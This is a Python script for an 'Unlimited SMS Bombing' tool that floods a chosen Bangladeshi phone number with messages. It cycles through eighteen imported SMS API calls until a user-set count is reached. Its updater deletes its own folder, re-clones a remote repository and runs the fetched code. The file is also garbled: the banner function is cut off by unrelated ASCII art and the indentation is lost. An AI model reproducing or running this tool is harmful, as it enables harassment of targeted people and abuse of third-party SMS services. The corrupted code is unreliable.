# SM BOMBER

# Tool : Unlimited SMS Bombing In Bangladeshi Numbers

#Author : SM BOMBER

# Coder : SM-SIAM

import time

import requests

import sys

import os

import shutil

from more.data import *

#Get Rows and Columns of Screen

columns = shutil.get_terminal_size().columns

def psb(z):

for e in z + '\n':

sys.stdout.write(e)

sys.stdout.flush()

time.sleep(0.01)

#Check Update

def update():

try:

toolVersion = open("./more/.version", "r").read()

except:

toolVersion = "SM-SIAM"

try:

mainVersion = requests.get("https://raw.githubusercontent.com/SM-SIAM/SMBomber/main/more/.version").text

except:

psb("\n\033[92m [\033[91m!\033[92m] Please Connect To The Internet!")

time.sleep(1)

l = input("\033[92m [\033[37m*\033[92m] Press Enter To Continue...")

update()

#If Tool Version Is Same, Then Return/Close Function

if (toolVersion == mainVersion):

return

psb("\n\033[92m [\033[37m!\033[92m] Tool Update Found!")

time.sleep(0.5)

psb("\033[92m [\033[37m!\033[92m] Updating Tool...")

os.system("cd .. && rm -rf SMbomber && git clone https://github.com/SM-SIAM/SMBomber > /dev/null 2>&1")

psb("\n\033[92m [\033[37m*\033[92m] Update Complete!")

psb("\033[92m [\033[37m*\033[92m] Starting Tool...")

time.sleep(0.8)

os.system("cd .. && cd SMbomber && python SM.py")

#Logo

def logo():

os.system("clear")

print("\033[94m┌────────────────────────────────────────┐".center(columns+5))

print("\033[94m│ \033[92........................,.............................................................. \033[94m │".center(columns+15))

print("\033[94m│ \033[92........................,.............................................................. \033[94m │".center(columns+15))

print("\033[94m│ \033[92m ........................,................................................ \033[94m │".center(columns+15))

print("\033[94m│ \033[92.........................,.................................................... \033[94m │".center(columns+15))

print("\033[94m│ \033[94m │".center(columns+9))

print("\033[94m│ \033[95mAuthor :SM-SIAM \033[94m│".center(columns+15))

print("│ \033[95mTool : Unlimited SMS Bomber \033[94m│".center(columns+9))

print("│ \033[95mGitHub : https://github.com/SM-SIAM \033[94m│".center(columns+9))

print("│ \033[95mCoder : SM-SIAM \033[37mV3.0 \033[94m│".center(columns+15))

print("\033[94m└────────────────────────────────────────┘".center(columns+5))

#Options Banner

def banner(,   ,
                                        $,  $,     ,
                                        "ss.$ss. .s'
                                ,     .ss$$$$$$$$$$s,
                                $. s$$$$$$$$$$$$$$`$$Ss
                                "$$$$$$$$$$$$$$$$$$o$$$       ,
                               s$$$$$$$$$$$$$$$$$$$$$$$$s,  ,s
                              s$$$$$$$$$"$$$$$$""""$$$$$$"$$$$$,
                              s$$$$$$$$$$s""$$$$ssssss"$$$$$$$$"
                             s$$$$$$$$$$'         `"""ss"$"$s""
                             s$$$$$$$$$$,              `"""""$  .s$$s
                             s$$$$$$$$$$$$s,...               `s$$'  `
                         `ssss$$$$$$$$$$$$$$$$$$$$####s.     .$$"$.   , s-
                           `""""$$$$$$$$$$$$$$$$$$$$#####$$$$$$"     $.$'
 Posable artist:                 "$$$$$$$$$$$$$$$$$$$$$####s""     .$$$|
   -Tua Xiong                      "$$$$$$$$$$$$$$$$$$$$$$$$##s    .$$" $
                                   $$""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"   `
                                  $$"  "$"$$$$$$$$$$$$$$$$$$$$S""""'
                             ,   ,"     '  $$$$$$$$$$$$$$$$####s
                             $.          .s$$$$$$$$$$$$$$$$$####"
                 ,           "$s.   ..ssS$$$$$$$$$$$$$$$$$$$####"
                 $           .$$$S$$$$$$$$$$$$$$$$$$$$$$$$#####"
                 Ss     ..sS$$$$$$$$$$$$$$$$$$$$$$$$$$$######""
                  "$$sS$$$$$$$$$$$$$$$$$$$$$$$$$$$########"
           ,      s$$$$$$$$$$$$$$$$$$$$$$$$#########""'
           $    s$$$$$$$$$$$$$$$$$$$$$#######""'      s'         ,
           $$..$$$$$$$$$$$$$$$$$$######"'       ....,$$....    ,$
            "$$$$$$$$$$$$$$$######"' ,     .sS$$$$$$$$$$$$$$$$s$$
              $$$$$$$$$$$$#####"     $, .s$$$$$$$$$$$$$$$$$$$$$$$$s.
   )          $$$$$$$$$$$#####'      `$$$$$$$$$###########$$$$$$$$$$$.
  ((          $$$$$$$$$$$#####       $$$$$$$$###"       "####$$$$$$$$$$
  ) \         $$$$$$$$$$$$####.     $$$$$$###"             "###$$$$$$$$$   s'
 (   )        $$$$$$$$$$$$$####.   $$$$$###"                ####$$$$$$$$s$$'
 )  ( (       $$"$$$$$$$$$$$#####.$$$$$###'                .###$$$$$$$$$$"
 (  )  )   _,$"   $$$$$$$$$$$$######.$$##'                .###$$$$$$$$$$
 ) (  ( \.         "$$$$$$$$$$$$$#######,,,.          ..####$$$$$$$$$$$"
(   )$ )  )        ,$$$$$$$$$$$$$$$$$$####################$$$$$$$$$$$"
(   ($$  ( \     _sS"  `"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$S$$,
 )  )$$$s ) )  .      .   `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"'  `$$
  (   $$$Ss/  .$,    .$,,s$$$$$$##S$$$$$$$$$$$$$$$$$$$$$$$$S""        '
    \)_$$$$$$$$$$$$$$$$$$$$$$$##"  $$        `$$.        `$$.
        `"S$$$$$$$$$$$$$$$$$#"      $          `$          `$
            `"""""""""""""'         '           '           '


****************************************************************************************************"**
 _______  _______    _______ _________ _______  _______             _______  _______  _______  _
(  ____ \(       )  (  ____ \\__   __/(  ___  )(       )  |\     /|(  ___  )(  ____ \(  ___  )( (    /|
| (    \/| () () |  | (    \/   ) (   | (   ) || () () |  | )   ( || (   ) || (    \/| (   ) ||  \  ( |
| (_____ | || || |  | (_____    | |   | (___) || || || |  | (___) || (___) || (_____ | (___) ||   \ | |
(_____  )| |(_)| |  (_____  )   | |   |  ___  || |(_)| |  |  ___  ||  ___  |(_____  )|  ___  || (\ \) |
      ) || |   | |        ) |   | |   | (   ) || |   | |  | (   ) || (   ) |      ) || (   ) || | \   |
/\____) || )   ( |  /\____) |___) (___| )   ( || )   ( |  | )   ( || )   ( |/\____) || )   ( || )  \  |
\_______)|/     \|  \_______)\_______/|/     \||/     \|  |/     \||/     \|\_______)|/     \||/    )_)):

amount = str(main.amount)

if (len(amount) == 1):

amount = amount + " "

elif (len(amount) == 2):

amount = amount + " "

elif (len(amount) == 3):

amount = amount + " "

elif (len(amount) == 4):

amount = amount + " "

#print(" ", end="")

print("\033[95m-" * (columns), end = "")

#print(" ")

print(("\033[92mTarget : \033[37m0" + main.number + " ").center(columns + 10))

print(("\033[92mAmount : \033[37m" + amount).center(columns + 10))

print("\033[92mProcess : \033[37mStarted ".center(columns + 10))

print("\033[92mNote : \033[37mPress ctrl + z To Stop".center(columns + 10))

#print(" ", end="")

print("\033[95m-" * (columns), end = "")

print("\n")

#Check SMS Sent and Process

def check(sent):

amount = main.amount

delay = main.delay

print("\r\033[92m [\033[94m#\033[92m] Massage Sent : \033[94m[\033[37m" + str(sent) + "\033[94m]\033[37m", end="")

if (sent == amount):

psb("\n\n\033[92m [\033[37m*\033[92m] Bombing Finished!")

psb("\033[92m [\033[37m*\033[92m] Amount : \033[37m" + str(amount))

psb("\033[92m [\033[37m*\033[92m] Target : \033[37m0" + main.number)

psb("\033[92m [\033[37m*\033[92m] From : \033[37mSM-SIAMBomber\n")

time.sleep(0.6)

print("\033[92m[\033[93m★\033[92m] Thanks For Using Our Tool \033[92m[\033[93m★\033[92m]".center(columns + 30))

print("\033[37m")

return True

else:

time.sleep(delay)

return False

#Get Target Number

def getNumber():

number = input("\n \033[92m[\033[37m*\033[92m] Enter Target Number:> \033[37m")

try:

int(number)

except:

psb("\n\033[92m [\033[91m!\033[92m] Please Enter a Correct Number!")

number = getNumber()

if not (len(number) == 11):

psb("\n\033[92m [\033[91m!\033[92m] Please Enter 11 Digit Number!")

number = getNumber()

return number

#Main 

def main():

number = getNumber()

number = number[-10:]

main.number = number

amount = input(" \033[92m[\033[37m*\033[92m] Enter Amount (\033[37mDefault: 10\033[92m):> \033[37m")

try:

amount = int(amount)

except:

amount = 100

main.amount = amount

delay = input(" \033[92m[\033[37m*\033[92m] Enter Time(\033[37mSec\033[92m) Delay (\033[37mDefault: 2s\033[92m):> \033[37m")

try:

int(delay)

except:

delay = 2

main.delay = int(delay)

time.sleep(1)

logo()

banner()

sent = 0

while True:

code = api1(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api2(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api3(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api4(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api5(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api6(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api7(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api8(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api9(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api10(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api11(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api12(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api13(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api14(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api15(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api16(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api17(number)

if (code == 200):

sent += 1

if(check(sent)):

break

code = api18(number)

if (code == 200):

sent += 1

if(check(sent)):

break

if __name__ == "__main__":

logo()

update()

main()

